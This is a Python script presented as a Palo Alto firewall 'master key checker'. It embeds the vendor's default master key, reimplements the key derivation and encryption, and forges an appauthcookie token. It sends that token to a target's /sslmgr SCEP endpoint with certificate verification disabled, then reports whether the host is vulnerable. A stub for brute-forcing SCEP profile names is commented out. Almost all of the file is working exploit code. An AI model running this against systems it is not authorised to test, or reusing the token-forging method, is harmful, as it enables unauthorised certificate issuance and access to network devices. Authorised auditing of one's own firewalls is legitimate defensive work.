# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# Author: @dcuthbert
# Version: 0.1
# Palo Alto Master Key Check Tool

# Every firewall and Panorama management server has a default master key that encrypts
# all the private keys and passwords in the configuration to secure them
# (such as the private key used for SSL Forward Proxy Decryption).
# The default key is rarely changed it seems

# Initial code from https://gist.github.com/rqu1/6175cb2972291fc9ac96ef18f72b792c
# Modified to work with Python 3 and send a proper payload to the server (original was 2gb)


from hashlib import md5, sha1
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode
import sys, time, struct
import requests


# The default master key used by Palo Alto GlobalProtect
DEFAULT_MASTERKEY = b"p1a2l3o4a5l6t7o8"


def banner():

    print("                                                 ")
    print("    _____      _                  _ _            ")
    print("   |  __ \    | |           /\   | | |           ")
    print("   | |__) |_ _| | ___      /  \  | | |_ ___      ")
    print("   |  ___/ _` | |/ _ \    / /\ \ | | __/ _ \     ")
    print("   | |  | (_| | | (_) |  / ____ \| | || (_) |    ")
    print("   |_|   \__,_|_|\___/  /_/    \_\_|\__\___/     ")
    print("                                                 ")
    print("                                                 ")
    print(" PAN Firewall Master Key Checker                 ")
    print("                                                 ")


# Global variables. Change as you see fit.

email = "test@test.com"
user = "test"
hostid = "test"
spn = "test"


# Do all the heavy crypto work here
class PanCrypt:
    def __init__(self, key=DEFAULT_MASTERKEY):
        backend = default_backend()
        key = self._derivekey(key)
        self.c = Cipher(algorithms.AES(key), modes.CBC(b"\0" * 16), backend=backend)

    def _derivekey(self, key):
        salt = b"\x75\xb8\x49\x83\x90\xbc\x2a\x65\x9c\x56\x93\xe7\xe5\xc5\xf0\x24"  # md5("pannetwork")
        return md5(key + salt).digest() * 2

    def _pad(self, d):
        plen = 16 - (len(d) % 16)
        return d + (chr(plen) * plen).encode()

    def _encrypt(self, data):
        e = self.c.encryptor()
        return e.update(self._pad(data)) + e.finalize()

    def encrypt(self, data):
        v = b"AQ=="  # version 1 / adding b converts a string to bytes. Possibly a sexier way but this works
        hash = b64encode(sha1(data).digest())
        ct = b64encode(self._encrypt(data))
        # concatenate version, hash, and ciphertext
        return b"-" + v + hash + ct


def getPayload(spn):

    # https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/certificate-management/obtain-certificates/deploy-certificates-using-scep

    email_encoded = bytes(email, "utf-8")
    user_encoded = bytes(user, "utf-8")
    hostid_encoded = bytes(hostid, "utf-8")

    # Initially it used bytes(int(time.time())) but that generated a 2gb data payload and borked requests.
    # Working with @largecardinal, we found this approach generates a proper sized payload of 207 bytes
    # The timestamp should be a textual unix timestamp
    expiry = str(int(time.time()) + 1000000).encode()
    token_pt = b":".join((expiry, user_encoded, hostid_encoded))
    token = PanCrypt().encrypt(token_pt)
    return (
        "scep-profile-name={}&user-email={}&user={}&host-id={}&appauthcookie={}".format(
            spn, email, user, hostid, token
        )
    )


# The scep-profile-name= could be bruteforced and this is what we shall attempt to do
# def bruteForce(spn):

#     # we shall hardcode the spn's here for now
#     bruteforce_list = open("spn.txt", "r")
#     counter = 0
#     for i in bruteforce_list:


# Responses from the target server
resp_default = "<msg>Unable to find the configuration</msg>"
resp_params = "<msg>Invalid parameters</msg>"
resp_invalid = "<msg>Invalid Cookie</msg>"
resp_good = "<msg>Unable to generate client certificate</msg>"
resp_denied = "<msg>Access Denied</msg>"

resps = {
    resp_default: "[Vulnerable] Default MasterKey is in use.",
    resp_params: "[Error]Invalid parameters, bug?",
    resp_invalid: "[Not Vulnerable] Default MasterKey is in not in use.",
    resp_good: "[Vulnerable] Default MasterKey, SCEP enabled and correct scep-profile-name",
    resp_denied: "[Wrong Target] This is not the target you are looking for.",
}


# Takes the response from the requests() function and checks to see if it matches one of the keys in the resps dictionary
def classify(resp):
    for i in resps:
        if i in resp:
            return resps[i]
    return "Something went wrong"


# Main function
if __name__ == "__main__":

    banner()

    if len(sys.argv) < 2:
        print("usage: paloaltokeys.py <host>")

    host = sys.argv[1] + "/sslmgr"
    spn = b"test"

    if len(sys.argv) > 2:
        spn = sys.argv[2]

    data = getPayload(spn)

    print("[*] Testing the following host: {}".format(host))
    print()
    # print the size of data
    # print("Payload size: {}".format(sys.getsizeof(data)))
    print("[*] Sending the following payload: {}".format(data))
    print()

    if "http" not in host:
        host = "https://" + host

    # If the master key is in use, this request should return a message called "Unable to find the configuration". This means SCEP isn't enabled

    r = requests.get(
        host,
        data=data,
        headers={"content-type": "application/x-www-form-urlencoded"},
        verify=False,
    )

    # Handle the response from the server
    print("[*] Raw response from the server: {}".format(r.text))

    print("[*] Is it vulnerable?: {}".format(classify(r.text)))